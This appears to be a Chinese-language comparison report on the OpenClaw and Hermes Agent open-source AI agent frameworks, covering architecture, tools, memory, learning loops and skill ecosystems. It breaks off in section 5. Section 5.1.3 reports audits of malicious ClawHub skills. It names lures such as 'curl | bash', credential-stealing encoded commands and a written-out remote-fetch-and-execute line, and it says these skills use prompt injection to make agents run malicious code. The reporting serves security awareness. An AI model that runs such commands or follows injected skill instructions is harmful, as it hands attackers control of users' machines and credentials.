---
title: "OpenClaw vs Hermes Agent — 2026 开源 AI Agent 深度对比研究"
date: 2026-05-11T12:00:00+08:00
draft: false
---

# OpenClaw vs Hermes Agent — 2026 开源 AI Agent 深度对比研究报告

> **摘要**：2026 年上半年，开源 AI Agent 领域涌现出两个标志性项目 —— OpenClaw（原 Clawdbot/MoltBot）和 Hermes Agent（Nous Research 出品）。两者均定位于"本地优先、自托管、多平台连接"的个人 AI 助手，但在架构哲学、学习机制、安全模型和社区生态上走了截然不同的道路。本报告从历史沿革、技术架构、核心能力、安全态势、生态系统、性能表现、部署方案、适用场景等十个维度进行全面对比分析，为开发者、团队和企业提供选型参考。

---

## 目录

- [第一章：项目概述与历史沿革](#1)
- [第二章：架构设计深度对比](#2)
- [第三章：核心功能模块详解](#3)
- [第四章：记忆与学习机制](#4)
- [第五章：技能系统生态](#5)
- [第六章：安全态势分析](#6)
- [第七章：模型支持与推理后端](#7)
- [第八章：部署与运维方案](#8)
- [第九章：社区生态与发展趋势](#9)
- [第十章：选型指南与未来展望](#10)
- [附录 A：关键术语表](#appendix-a)
- [附录 B：参考资料列表](#appendix-b)

---

## 第一章：项目概述与历史沿革 {#1}

### 1.1 OpenClaw：从病毒式传播到安全危机再到独立基金会

OpenClaw 的故事始于 2025 年 11 月，由奥地利工程师 Peter Steinberger（PSPDFKit 创始人）发布，最初名为 **Clawdbot**。其核心理念简单而强大：与其让 AI 聊天机器人停留在浏览器窗口里回答问题，不如让 AI 成为一个真正能"做事"的代理（agent）—— 它连接到你日常使用的通讯工具（WhatsApp、Telegram、Slack 等），拥有系统级访问权限，可以执行文件操作、运行脚本、自动化工作流。

**关键时间线：**

| 日期 | 事件 |
|------|------|
| 2025 年 11 月 | Clawdbot 首次发布，采用 Node.js 构建 |
| 2026 年 1 月 23-26 日 | 用户激增，数百个未认证的 Gateway 实例暴露在互联网上 |
| 2026 年 1 月 27 日 | Anthropic 发起商标争议（名称与 Claude 过于相似），项目更名为 **MoltBot** |
| 2026 年 1 月 27-29 日 | 加密骗局爆发，假 `$CLAWD` 代币市值达 1600 万美元；假 VS Code 扩展植入 ScreenConnect RAT |
| 2026 年 1 月 30 日 | CVE-2026-25253 被修复（v2026.1.29），Palo Alto Networks 将漏洞映射到 OWASP Top 10 |
| 2026 年 1 月 31 日 | Censys 发现 21,639 个公开暴露的实例，30%+ 部署在阿里云 |
| 2026 年 2 月 1-2 日 | Moltbook 数据库泄露（150 万 API token 公开）；命令注入 CVE 发布；比利时 CCB 发布国家安全公告 |
| 2026 年 2 月 | 项目再次更名为 **OpenClaw**，成立独立开源基金会 |
| 2026 年 2 月 15 日 | Steinberger 加入 OpenAI，项目治理移交社区基金会 |
| 2026 年 3-5 月 | GitHub Stars 突破 356,000+，贡献者 600+，ClawHub 技能数突破 13,700+ |

**项目定位：**

> "OpenClaw 不是一个聊天机器人。它是一个具有系统级访问权限的 Agent 运行时环境。这一区别驱动了每一个下游安全决策。"

OpenClaw 的核心理念可以概括为：**将无状态的 LLM 转变为有状态的、持续可用的、能够使用工具的代理**。它不是对某个 API 的简单封装，而是一个完整的 Agent 运行时环境，包含会话管理、记忆持久化、上下文窗口优化、多渠道消息桥接、沙箱化执行和事件驱动扩展性。

**当前状态：**

- **GitHub Stars：** 356,000+
- **贡献者：** 600+
- **Commit 数：** 15,000+
- **Fork 数：** 50,000+
- **Discord 成员：** 15,000+
- **许可证：** MIT
- **ClawHub 技能：** 13,700+
- **支持平台：** macOS、Linux、Windows（WSL2）、Raspberry Pi

### 1.2 Hermes Agent：Nous Research 的自进化 AI 代理

Hermes Agent 由 Nous Research 于 2026 年 2 月 25 日发布，其核心理念与 OpenClaw 有重叠但更聚焦于一个关键差异化特征：**内置的学习循环（Learning Loop）**。Nous Research 本身就是知名的开源 LLM 研究组织（以 Hermes 系列模型闻名），他们构建 Agent 的视角更偏向于"如何让 AI 越用越聪明"，而非仅仅"让 AI 能执行任务"。

**关键时间线：**

| 日期 | 事件 |
|------|------|
| 2026 年 2 月 25 日 | Hermes Agent 首次发布（MIT 许可证） |
| 2026 年 3 月 | GitHub Stars 突破 10,000，社区快速成长 |
| 2026 年 4 月 3 日 | v0.7.0 "Resilience Release" 发布 |
| 2026 年 4 月 8 日 | v0.8.0 发布，超过 1,000 个合并 PR |
| 2026 年 5 月 7 日 | v0.13.0 "The Tenacity Release" 发布 |
| 2026 年 5 月 | GitHub Stars 突破 44,000+，大量开发者从 OpenClaw 迁移 |

**项目定位：**

> "它不是绑定在 IDE 中的编码助手，也不是围绕单一 API 包装的聊天机器人。它是一个自主 Agent，运行时间越长，能力越强。"

Hermes Agent 的核心差异化在于其 **封闭学习循环（Closed Learning Loop）**：`Observe → Plan → Act → Learn`。当 Agent 完成一个任务后，它会自动分析结果，提取可重用的"技能"（以 Markdown 格式存储），并持续优化它们。这种设计解决了 AI 助手最大的痛点：**每次对话结束后一切归零的失忆症**。

**当前状态：**

- **GitHub Stars：** 44,000+（两个月内达到）
- **许可证：** MIT
- **内置技能：** 70+
- **支持模型：** 400+（任何 OpenAI 兼容端点）
- **支持平台：** Linux、macOS、WSL2、Windows（早期 Beta）、Android（Termux）

### 1.3 命名与品牌对比

| 维度 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| 原名 | Clawdbot → MoltBot | 无 |
| 更名原因 | Anthropic 商标争议 | 无 |
| 吉祥物 | 龙虾（Lobster，寓意蜕壳成长） | Hermes（希腊神话信使） |
| 社区标签 | #OpenClaw, #ClawHub | #HermesAgent, #NousResearch |
| 创始人 | Peter Steinberger | Nous Research 团队 |
| 治理模式 | 独立开源基金会 | Nous Research（学术机构） |

---

## 第二章：架构设计深度对比 {#2}

### 2.1 OpenClaw 架构：网关为中心的 Agent 运行时

OpenClaw 采用 **网关（Gateway）为中心** 的架构设计，这是其最核心的技术特征。

#### 2.1.1 整体架构层次

```
┌─────────────────────────────────────────────────────────┐
│                   消息接入层                              │
│ WhatsApp · Telegram · Discord · Slack · Signal · Web     │
└──────────────────────────┬──────────────────────────────┘
                           │ WebSocket / HTTP
                           ▼
┌─────────────────────────────────────────────────────────┐
│                   Gateway（守护进程）                      │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Channel  │ │ Session  │ │ Command  │ │ Plugin    │   │
│ │ Bridges  │ │ Manager  │ │ Queue    │ │ System    │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Hooks    │ │   Cron   │ │Heartbeat │ │   Auth    │   │
│ │ Engine   │ │ Scheduler│ │ System   │ │ + Trust   │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│               Agent Runtime（pi-mono）                     │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Prompt   │ │ Tool     │ │Compaction│ │ Memory    │   │
│ │ Assembly │ │Execution │ │ Pipeline │ │ Search    │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Streaming│ │Sub-Agent │ │ Skill    │ │ Sandbox   │   │
│ │ Engine   │ │ Spawner  │ │ Loader   │ │ Manager   │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                   LLM Providers                           │
│   Anthropic · AWS Bedrock · OpenAI · Google · Local       │
└─────────────────────────────────────────────────────────┘
```

#### 2.1.2 Gateway：中枢神经系统

Gateway 是一个长期运行的 Node.js 守护进程，是整个应用的"应用服务器"。所有状态和连接都通过它流转。

**核心特性：**

- **默认端口：** `127.0.0.1:18789`（可配置）
- **传输协议：** WebSocket，文本帧 + JSON 载荷
- **线路协议：**
  ```json
  // 请求/响应
  {"type": "req", "id": "...", "method": "...", "params": {...}}
  // 响应
  {"type": "res", "id": "...", "ok": true, "payload": {...}}
  // 事件
  {"type": "event", "event": "...", "payload": {...}, "seq": 1}
  ```
- **幂等性键（Idempotency Keys）：** 对副作用方法（send、agent）必须提供
- **连接生命周期：** `connect` 握手 → `presence`/`tick` 事件 → `agent` 请求 → 流式增量 → 最终摘要

**设备配对与信任机制：**

- **本地连接（loopback/Tailnet）：** 自动批准
- **非本地连接：** 需要签名挑战 nonce + 明确批准
- **认证：** `OPENCLAW_GATEWAY_TOKEN` 全局应用；配对后发放设备 token

**渠道桥接（Channel Bridges）：**

维护到各平台的持久连接，将事件翻译为标准化的内部信封：

| 平台 | 底层库 |
|------|--------|
| WhatsApp | Baileys |
| Telegram | grammY |
| Discord | Discord.js |
| Slack | Bolt |
| Signal | signal-cli |
| iMessage | imessage-exporter |
| WebChat | WebSocket |

关键洞察：Gateway 是唯一持有消息会话的进程（每个主机/bot 恰好一个）。

#### 2.1.3 Agent Loop 与执行

**入站消息路由：**

```
入站消息 → 渠道桥接 → 会话解析 → 命令队列 → Agent 运行时
```

**会话解析（dmScope）：**

| 模式 | 说明 |
|------|------|
| `main` | 所有 DM 共享一个会话 |
| `per-peer` | 按发送者 ID 隔离 |
| `per-channel-peer` | 按渠道 + 发送者隔离（推荐多用户场景） |

**命令队列（感知车道的 FIFO）：**

```
┌─────────────────────────────────────────┐
│           Global Lane (main)            │
│ maxConcurrent: 4 (可配置)                │
│ ┌─────────────────────────────────┐     │
│ │ Session Lane (per session key)  │     │
│ │ concurrency: 1 (严格串行)        │     │
│ └─────────────────────────────────┘     │
│ ┌─────────────────────────────────┐     │
│ │ Sub-agent Lane                  │     │
│ │ concurrency: 8                  │     │
│ └─────────────────────────────────┘     │
│ ┌─────────────────────────────────┐     │
│ │ Cron Lane                       │     │
│ │ 与 main 并行                     │     │
│ └─────────────────────────────────┘     │
└─────────────────────────────────────────┘
```

**工具执行沙箱：**

OpenClaw 支持多种沙箱模式：

- **本地执行：** 直接运行在主机上（最高性能，最高风险）
- **Docker 容器：** 隔离执行环境
- **SSH 远程：** 在远程机器上执行
- **VM 沙箱（"偏执模式"）：** 最大隔离，被攻破的 Agent 被限制在 VM 内

#### 2.1.4 Lobster Workflow Shell

OpenClaw 使用名为 **Lobster** 的工作流 Shell 来驱动 Agent 循环。这是一个动态规划和执行命令的系统，与简单的"聊天机器人包装器"有本质区别。

> "当你让 ChatGPT 预订航班时，它会解释步骤。当你让 OpenClaw 做时，它会尝试真正去做。"

### 2.2 Hermes Agent 架构：学习循环为核心的单 Agent 设计

Hermes Agent 采用 **单 Agent、自进化** 的架构设计，核心差异在于其内置的学习循环和分层记忆系统。

#### 2.2.1 整体架构层次

```
┌─────────────────────────────────────────────────────────┐
│                   消息接入层                              │
│ CLI · Telegram · Discord · Slack · WhatsApp · Signal     │
│ · Email · Google Chat · IRC · Teams · QQBot · 元宝       │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                   Gateway（守护进程）                      │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Platform │ │ Session  │ │  Cron    │ │ Delivery  │   │
│ │ Adapters │ │ Routing  │ │Scheduler │ │ Engine    │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Voice    │ │  Plugin  │ │ TTS/STT  │ │  Web UI   │   │
│ │ Transcrip│ │  Loader  │ │ Pipeline │ │ Dashboard │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│               Agent Loop (run_agent.py)                  │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Prompt   │ │ API      │ │ Tool     │ │ Finalize  │   │
│ │ Build    │ │ Call     │ │ Loop     │ │ & Deliver │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐   │
│ │ Session  │ │ Skill    │ │ Memory   │ │ Sub-agent │   │
│ │ Search   │ │ Loader   │ │ Nudge    │ │ Spawner   │   │
│ └──────────┘ └──────────┘ └──────────┘ └───────────┘   │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                   LLM Providers                           │
│   Nous Portal · OpenRouter(200+) · NVIDIA NIM · Ollama   │
│   OpenAI · Google · 智谱 · MiniMax · z.ai · Custom       │
└─────────────────────────────────────────────────────────┘
```

#### 2.2.2 Agent Loop 执行引擎（run_agent.py）

Hermes Agent 的 Agent 循环是同步编排的，处理每个入站消息：

**Turn 生命周期：**

```
任务 ID → 加载/构建 Prompt → 前置压缩检查 → API 调用 → 工具执行循环
→ 最终文本 → 持久化到 SQLite → Gateway 响应
```

**压缩作为整合（Compression as Consolidation）：**

- 哨兵（Sentinel）在硬上下文限制前触发
- 辅助模型提取关键信息到记忆中（≤3,575 字符）并总结中间对话
- **血缘（Lineage）** 在 SQLite 中保留：引用链将总结的对话连接回原始对话，保证可追溯性

**Prompt 缓存与故障转移：**

- 稳定的系统 Prompt 前缀被提供商缓存 → 降低延迟和成本
- **缓存失效条件：** 模型切换、记忆文件变更、上下文文件变更
- **提供商故障转移：** 在 `config.yaml` 中配置有序列表。在 turn 中间自动故障转移到下一个提供商，用户无感知

#### 2.2.3 终端后端与安全默认值

| 后端 | 最佳使用场景 |
|------|-------------|
| **Local** | 个人使用，最低延迟 |
| **Docker** | 隔离执行，安全运行不受信任的代码 |
| **SSH** | 远程执行，多机管理 |
| **Singularity** | HPC 环境 |
| **Modal** | 按需 serverless，空闲时成本接近零 |
| **Daytona** | 安全的沙箱执行 |
| **Vercel Sandbox** | Web 原生沙箱 |

#### 2.2.4 可插拔架构

- **33 个模型提供商** 现在位于 `plugins/model-providers/` 下，使用 `ProviderProfile` ABC。用户插件通过 `~/.hermes/plugins/model-providers/<name>/` 覆盖内置的。
- **平台适配器**（Telegram、Discord、Slack、WhatsApp、Signal、Google Chat、IRC、Teams、QQBot、元宝）遵循相同的即插即用模式。
- **扩展面：** MCP 服务器、Gateway 事件钩子（`HOOK.yaml`）、Shell 钩子、技能调用、TTS/STT 命令提供商、记忆/上下文引擎和图像生成后端。

---

## 第三章：核心功能模块详解 {#3}

### 3.1 消息平台支持

| 平台 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| Telegram | ✅ | ✅ |
| Discord | ✅ | ✅ |
| Slack | ✅ | ✅ |
| WhatsApp | ✅ | ✅ |
| Signal | ✅ | ✅ |
| iMessage | ✅ | ❌ |
| Email | ❌ | ✅ |
| Google Chat | ❌ | ✅ |
| IRC | ❌ | ✅ |
| Teams | ✅ | ✅ |
| Matrix | ✅ | ❌ |
| CLI/TUI | ✅ | ✅（增强 TUI） |
| Web UI | ✅（Control UI） | ✅（Dashboard） |
| QQBot | ❌ | ✅ |
| 元宝（Yuanbao） | ❌ | ✅ |
| **支持平台总数** | **50+** | **15+** |

**OpenClaw 优势：** 平台覆盖面更广，特别是 iMessage、Matrix 等独特平台。

**Hermes Agent 优势：** TUI 更丰富（多行编辑、斜杠命令自动补全、会话历史、中断并重定向、流式工具输出）；支持中国本土平台（QQBot、元宝）。

### 3.2 工具集对比

#### 3.2.1 OpenClaw 内置工具

- **浏览器自动化：** 完整的浏览器控制能力
- **文件系统：** 读写文件、目录操作
- **Shell 执行：** 运行任意命令
- **Cron 调度：** 定时任务
- **Webhooks：** 事件驱动触发
- **摄像头/屏幕录制：** 多媒体捕获
- **MCP 服务器集成：** 支持 Model Context Protocol

#### 3.2.2 Hermes Agent 内置工具

Hermes Agent 提供 **70+ 内置工具**，按工具集（toolsets）分组：

| 工具集 | 工具 | 说明 |
|--------|------|------|
| **web** | `web_search`, `web_extract` | 网络搜索与内容提取 |
| **file** | `read_file`, `write_file`, `search_files`, `patch` | 文件操作 |
| **terminal** | `terminal` | Shell 执行（支持前台/后台/PTY） |
| **browser** | 浏览器自动化 | Playwright 驱动 |
| **vision** | `vision_analyze` | 图像分析 |
| **image_gen** | 图像生成 | ComfyUI 等后端 |
| **tts** | `text_to_speech` | 文本转语音 |
| **video** | 视频处理 | 视频生成/编辑 |
| **cronjob** | `cronjob` | 定时任务管理 |
| **delegation** | `delegate_task` | 子 Agent 派生 |
| **memory** | `memory` | 持久记忆 |
| **skill_manage** | `skill_manage`, `skill_view` | 技能管理 |
| **todo** | `todo` | 任务管理 |
| **session_search** | `session_search` | 历史会话搜索 |
| **clarify** | `clarify` | 用户确认/多选择 |
| **execute_code** | `execute_code` | Python 代码执行 |
| **process** | `process` | 后台进程管理 |
| **send_message** | `send_message` | 消息发送 |

#### 3.2.3 工具集对比分析

| 维度 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| 工具数量 | ~15+ 内置 | 70+ 内置 |
| MCP 集成 | ✅ | ✅ |
| 浏览器自动化 | ✅ | ✅ |
| 代码执行 | ✅（Shell） | ✅（Shell + Python RPC） |
| 图像分析 | ❌ | ✅ |
| TTS | ❌ | ✅ |
| 子 Agent 派生 | ✅ | ✅ |
| 持久记忆 | ✅（Memory.md） | ✅（多层记忆） |
| 会话搜索 | ✅ | ✅（FTS5 + LLM 摘要） |
| Python 工具调用 | ❌ | ✅（execute_code） |

### 3.3 调度与自动化

**OpenClaw Cron：**

- 内置 Cron 调度器
- 与 Gateway 并行运行
- 支持自然语言任务定义

**Hermes Agent Cronjob：**

- 更丰富的功能集：
  - 自然语言任务定义
  - 平台交付（推送到 Telegram/Discord/微信等）
  - 技能绑定
  - 脚本执行（支持 shell/Python）
  - 上下文注入（链式任务：job A 收集数据，job B 处理）
  - 模型覆盖（每个 job 可指定不同模型）
  - 无 Agent 模式（纯脚本执行，零 token 消耗）
  - 工作目录支持（加载项目的 AGENTS.md/CLAUDE.md）
  - 工具集限制（减少 token 开销）
  - 重复计数控制

### 3.4 语音功能

| 功能 | OpenClaw | Hermes Agent |
|------|----------|--------------|
| 语音输入 | ❌ | ✅（语音备忘录转写） |
| 语音输出 | ❌ | ✅（TTS，多提供商：Edge/OpenAI/xAI/MiniMax/ElevenLabs） |
| 实时语音对话 | ❌ | ✅（CLI、Telegram、Discord、Discord VC） |
| Discord VC 支持 | ❌ | ✅ |

### 3.5 Web UI Dashboard

**OpenClaw Control UI：**

- 访问地址：`http://127.0.0.1:18789/`
- 功能：会话管理、配置编辑、状态监控
- 技术：Web 应用

**Hermes Agent Dashboard：**

- 访问方式：`hermes web`
- 页面：
  - 状态页：Agent 版本、活跃会话、Gateway 状态、连接平台
  - 配置编辑器：Schema 驱动的表单，分类标签，导入/导出，重置
  - API Keys 页：设置、清除、查看脱敏值，分类分组
  - 会话、技能、Cron、日志和分析页
- 技术：Vite + React + TypeScript + Tailwind v4 SPA
- 安全：路径遍历防护、CORS 仅本地、通用错误信息

### 3.6 上下文文件（Context Files）

**Hermes Agent 特有功能：**

- 项目上下文文件塑造每次对话
- 支持 `AGENTS.md`、`CLAUDE.md`、`.cursorrules` 等标准
- 工作目录模式下自动加载

---

## 第四章：记忆与学习机制 {#4}

这是两个框架最本质的区别所在，也是本报告最重要的章节之一。

### 4.1 OpenClaw 的记忆模型

OpenClaw 的记忆系统相对简单，主要依赖两个文件：

| 文件 | 用途 |
|------|------|
| `SOUL.md` | Agent 的性格、角色和行为准则 |
| `MEMORY.md` | 跨会话的记忆持久化 |

**工作原理：**

- 交互结束后，Agent 将重要信息写入 `MEMORY.md`
- 下次启动时，`MEMORY.md` 的内容被注入到系统 Prompt 中
- 这种设计允许基本的跨会话记忆

**局限性：**

- 所有内容都注入到系统 Prompt 中，导致上下文膨胀
- 没有分层管理，无法区分"短期上下文"和"长期技能"
- 没有自动学习循环 —— 记忆的创建和维护主要依赖用户手动或简单的后处理
- 随着使用增加，token 成本线性增长

### 4.2 Hermes Agent 的四层记忆架构

Hermes Agent 采用 **四层记忆架构**，将不同类型的记忆隔离，按职责、磁盘位置和读取时机区分，从根本上解决了上下文膨胀问题。

| 层级 | 位置 | 行为 | 关键约束 |
|------|------|------|----------|
| **Prompt 记忆** | `~/.hermes/memories/MEMORY.md` & `USER.md` | 始终在线，会话前注入系统 Prompt | **3,575 字符限制**（强制精简）。编辑在下次会话生效 |
| **会话搜索** | SQLite + FTS5 | Agent 认为需要过去上下文时按需检索 | 主题特定。Agent 在周期性提醒时决定层级 |
| **技能记忆** | `~/.hermes/skills/` | 渐进式披露：默认只加载名称/摘要 | 按需加载完整内容。**无论技能数量多少，token 成本保持不变** |
| **Honcho 层** | 可选外部模块 | 被动用户建模，覆盖 **12 个身份层**（偏好、风格、知识） | 辩证建模。最适合日常个人助手 |

**关键洞察：**

> Hermes 的核心差异化在于将"记录发生了什么"（episodic memory）与"记录什么方法有效"（procedural memory）明确分离。

#### 4.2.1 四层记忆详解

**第一层：Prompt 记忆（MEMORY.md & USER.md）**

- 始终加载到系统 Prompt 中
- 3,575 字符的硬限制强制 Agent 进行记忆筛选
- 用户偏好、环境事实、工具怪癖等稳定信息存储在这里
- 编辑在下次会话生效，保证一致性

**第二层：会话搜索（FTS5）**

- 所有会话归档到 SQLite，使用 FTS5 全文索引
- Agent 查询过去上下文 → LLM 总结结果 → 仅注入相关数据
- 零 LLM 成本的"最近会话浏览"（无查询参数）
- 关键词搜索返回 LLM 生成的匹配会话摘要

**第三层：技能记忆（~/.hermes/skills/）**

- 渐进式披露：默认只加载名称和摘要
- 完整内容仅在需要时加载
- Token 成本不随技能数量增长
- 这是 Hermes 实现"越用越聪明"的关键机制

**第四层：Honcho 用户建模**

- 可选的外部模块
- 跨 12 个身份层构建用户模型：偏好、风格、知识、习惯等
- 使用辩证建模方法
- 最适合需要深度理解用户的日常个人助手场景

### 4.3 封闭学习循环（Closed Learning Loop）

Hermes Agent 的学习循环是四个相互关联组件构成的持续过程：

```
┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
│ Observe  │────▶│  Plan    │────▶│   Act    │────▶│  Learn   │
│ (观察)    │     │ (规划)    │     │ (执行)    │     │ (学习)    │
└──────────┘     └──────────┘     └──────────┘     └──────────┘
      ▲                                                    │
      └────────────────────────────────────────────────────┘
```

#### 4.3.1 组件 1：Agent 策展记忆（周期性提醒）

- 内部系统 Prompt 在设定间隔触发，要求 Agent 评估近期活动
- 仅当超过有用性阈值时才持久化到记忆
- 防止"日志倾倒"式的记忆膨胀

#### 4.3.2 组件 2：自主技能创建

- **触发条件：** ≥5 次工具调用、错误恢复、用户纠正、或非显而易见的成功工作流
- 保存为可重用的指令集到 `~/.hermes/skills/`（不是日志）
- 遵循开放的 **`agentskills.io`** 标准，支持跨 Agent 可移植性
- 技能格式：
  ```yaml
  ---
  name: my-skill
  description: Brief description of what this skill does
  version: 1.0.0
  platforms: [macos, linux]
  metadata:
    hermes:
      tags: [python, automation]
      category: devops
      fallback_for_toolsets: [web]
      requires_toolsets: [terminal]
  ---
  ```

#### 4.3.3 组件 3：技能自我改进

- 技能是可变的。Agent 在执行过程中如果发现更好的路径，会更新技能
- **6 种 `skill_manage` 操作：** `create`、`patch`、`edit`、`delete`、`write_file`、`remove_file`
- **默认使用 `patch`：** 只传递旧/新字符串。比完整重写（`edit`）更节省 token 且更安全
- 如果使用的技能过时或不完整，立即修补 —— 否则技能会成为负担

#### 4.3.4 组件 4：FTS5 会话搜索 + LLM 摘要

- 会话归档到 SQLite，使用 FTS5 全文索引
- Agent 查询过去上下文 → LLM 总结结果 → 仅注入相关数据
- 明确分离情景记忆（什么/何时）和程序记忆（如何）

### 4.4 自进化生态系统

Hermes Agent 有一个独立的仓库 `hermes-agent-self-evolution`，利用 **DSPy + GEPA** 自动优化技能和 Prompt。

| 组件 | 功能 |
|------|------|
| **DSPy** | 声明式 LM 编程，自动优化 Prompt |
| **GEPA** | 基于进化的 Prompt 优化 |
| **Atropos** | RL 环境，用于轨迹生成和模型训练 |
| **轨迹压缩** | 压缩轨迹用于训练下一代工具调用模型 |

这种设计使 Hermes Agent 不仅能"学习"，还能"进化" —— 随着使用，它的 Prompt 和技能会越来越高效。

### 4.5 记忆与学习机制对比总结

| 维度 | OpenClaw | Hermes Agent | 胜出 |
|------|----------|--------------|------|
| 跨会话记忆 | ✅（MEMORY.md） | ✅（四层架构） | **Hermes** |
| 自动技能创建 | ❌ | ✅ | **Hermes** |
| 技能自我改进 | ❌ | ✅ | **Hermes** |
| 上下文成本控制 | ❌（线性增长） | ✅（渐进式披露） | **Hermes** |
| 用户建模 | ❌ | ✅（Honcho，12 层） | **Hermes** |
| 会话搜索 | ✅ | ✅（FTS5 + LLM 摘要） | 平手 |
| Prompt 优化 | ❌ | ✅（DSPy + GEPA） | **Hermes** |
| 记忆可移植性 | 封闭格式 | 开放标准（agentskills.io） | **Hermes** |

---

## 第五章：技能系统生态 {#5}

### 5.1 OpenClaw 技能系统

#### 5.1.1 技能格式

OpenClaw 技能由 `SKILL.md` 文件定义，可以捆绑、通过 ClawHub 管理，或保存在工作区本地。

**基本结构：**
```markdown
# Skill Name

Description of what this skill does.

## When to Use
Conditions under which this skill should be loaded.

## Instructions
Step-by-step instructions for the agent.

## Pitfalls
Known issues and how to avoid them.
```

#### 5.1.2 ClawHub：公共技能注册表

**规模：**

- 3,500+ 条目（持续增长）
- 每日提交量从 1 月中旬的 <50 激增到 2 月初的 >500（数周内增长 10 倍）
- 总计 13,700+ 技能

**发布门槛：**

- 仅需一周以上历史的 GitHub 账号
- **无代码签名、无强制审查、无默认沙箱**

**安装命令：**

```bash
openclaw skills install <skill-name>
# 或
npx -y clawhub@latest install <skill-name>
```

#### 5.1.3 ClawHub 供应链安全问题

这是 OpenClaw 生态系统最严重的薄弱环节。多个独立安全审计发现了大量恶意技能：

| 审计方 | 发现 | 关键威胁 |
|--------|------|----------|
| **Koi Security** | 2,857 中 341 个恶意（~12%） | "ClawHavoc" 活动分发 Atomic Stealer (AMOS) |
| **Bitdefender** | ~900 个恶意（~20%） | 假 Polymarket 机器人打开反向 Shell |
| **Snyk** | 36% 有缺陷，1,467 个有漏洞，76 个恶意 | 注册表中广泛的安全缺陷 |
| **VirusTotal** | 扫描 3,016 个 | 发布者 `hightower6eu` 上传 314+ 恶意技能 |
| **Cisco AI Defense** | 排名第一的技能有 9 个漏洞（2 个严重） | 数据泄露和 Prompt 注入 |
| **Silverfort** | 排名系统可被操纵 | 攻击者可将恶意技能推至排名第一 |

**主要攻击向量：**

- 专业的 `SKILL.md` 文档，带有假的"先决条件"部分，诱骗用户运行 `curl | bash` 或下载外部二进制文件
- 密码保护的 ZIP 文件（经典 AV 规避）
- Base64/Unicode 命令窃取凭证
- `curl https://remote-server.com/instructions.md | source`（动态远程执行）

**Snyk ToxicSkills 研究关键发现：**

| 指标 | 数量 | 百分比 |
|------|------|--------|
| 扫描技能总数 | 3,984 | — |
| 严重安全问题 | 534 | **13.4%** |
| 任何安全缺陷 | 1,467 | **36.82%** |
| 确认恶意载荷 | 76 | — |
| 恶意技能仍在线 | 8 | — |

**关键趋同发现：**

> **100% 的确认恶意技能包含恶意代码模式，同时 91% 使用 Prompt 注入技术。**
>
> "Prompt 注入使 Agent 接受并执行恶意代码，而人类审查者或 Agent 自身的安全机制通常会拒绝这些代码。"

### 5.2 Hermes Agent 技能系统

#### 5.2.1 技能格式

Hermes Agent 技能也遵循 `SKILL.md` 格式，但增加了 YAML 前物（frontmatter）用于元数据：

```yaml
---
name: llama-cpp-inference
description: llama.cpp GPU inference deployment — building with CUDA, ...
version: 1.0.0
platforms: [linux, macos]
metadata:
  hermes:
    tags: [ml, inference, gpu]
    category: mlops
    fallback_for_toolsets: [web]
    requires_toolsets: [terminal, file]
---

# Skill Body

When to use, step-by-step instructions, pitfalls, verification steps...
```

#### 5.2.2 技能管理

| 操作 | 说明 |
|------|------|
| `create` | 创建新技能（完整 SKILL.md + 可选分类） |
| `patch` | 修补现有技能（推荐用于修复） |
| `edit` | 完整重写（仅限重大修改） |
| `delete` | 删除技能 |
| `write_file` | 写入技能目录中的支持文件 |
| `remove_file` | 删除技能目录中的支持文件 |

#### 5.2.3 技能目录结构

```
~/.hermes/skills/
├── hermes-agent/          # 内置技能
│   └── SKILL.md
├── llama-cpp-inference/   # 用户/自动创建的技能
│   ├── SKILL.md
│   └── references/        # 支持文件
│       └── config-example.md
└── ...
```

**支持文件目录：**

- `references/` — 参考文档
- `templates/` — 模板文件
- `scripts/` — 脚本文件
- `assets/` — 资源文件

#### 5.2.4 技能加载机制

Hermes Agent 采用 **动态技能加载**：

1. 默认只加载技能名称和摘要
2. 当 Agent 判断需要某个技能时，才加载完整内容
3. 这确保了 **token 成本不随技能数量增长**

相比之下，OpenClaw 将所有加载的技能内容注入 Prompt，导致上下文随技能增加而膨胀。

### 5.3 技能生态系统对比

| 维度 | OpenClaw (ClawHub) | Hermes Agent |
|------|-------------------|--------------|
| 技能数量 | 13,700+ | 70+ 内置，社区快速增长 |
| 注册表 | ClawHub（clawhub.ai） | 本地 + 社区 GitHub |
| 发布门槛 | GitHub 账号 >1 周 | 无集中注册表 |
| 安全审查 | ❌（无强制审查） | ❌（但无集中分发风险） |
| 恶意技能比例 | ~12-20% | N/A（无集中分发） |
| 标准 | SKILL.md | SKILL.md + agentskills.io |
| 跨 Agent 可移植性 | ✅（SKILL.md 格式可移植） | ✅（agentskills.io 标准） |
| 版本控制 | ✅（semver） | ✅（版本字段） |
| 分类系统 | ✅（标签） | ✅（分类目录） |
| 自动创建 | ❌ | ✅（Agent 自主创建） |

**关键差异：**

